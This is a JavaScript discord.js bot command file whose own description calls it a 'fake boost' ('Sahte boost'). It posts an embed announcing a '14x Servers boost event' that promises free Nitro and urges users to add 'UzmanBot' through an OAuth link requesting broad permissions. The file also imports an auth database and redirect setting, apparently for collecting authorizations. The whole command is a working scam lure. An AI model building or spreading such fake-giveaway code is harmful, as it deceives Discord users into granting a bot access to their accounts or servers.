
const { ApplicationCommandType, ApplicationCommandOptionType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const discord = require("discord.js");
let AuthDB = require(`../../database/AuthDB`)
const { redirect_uri } = require("../../config.js");


module.exports = {
  name: "boost",
  description: "Sahte boost",
  options: null,

  type: ApplicationCommandType.ChatInput,
  run: async (client, interaction, args) => {



    let embed1 = new discord.EmbedBuilder()
      .setTitle(`<a:Boost:1047991583523479652> 14x Servers boost event <a:Boost:1047991583523479652>`)
      .setDescription(`\n**Follow these steps to claim the 14x Boost Nitro code**.\n\n\n1. **Add [UzmanBot.](https://discord.com/api/oauth2/authorize?client_id=1040624236668141641&permissions=0&scope=bot)**\n**2. After adding the Giveaway bot use the command g?nitro and wait 24 hours.** <:ok:1048720975602135040>\n**3. Enjoy Your Nitro!** <:ok:1048720975602135040> `)
    .setImage('https://media.discordapp.net/attachments/1041117746697621624/1041120634916319323/unknowns.png')
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel("Add UzmanBot")
      .setStyle(ButtonStyle.Link)
        .setURL('https://discord.com/api/oauth2/authorize?client_id=986602224325132338&scope=bot+applications.commands&permissions=1374891928950')
          .setDisabled(false),
        new ButtonBuilder()
          .setCustomId('next')
          .setLabel("Claim 14x Boosts")
      .setStyle(ButtonStyle.Danger)
          .setDisabled(true),
      );


    await interaction.reply({
      embeds: [embed1],
      components: [row]

    });

  },
};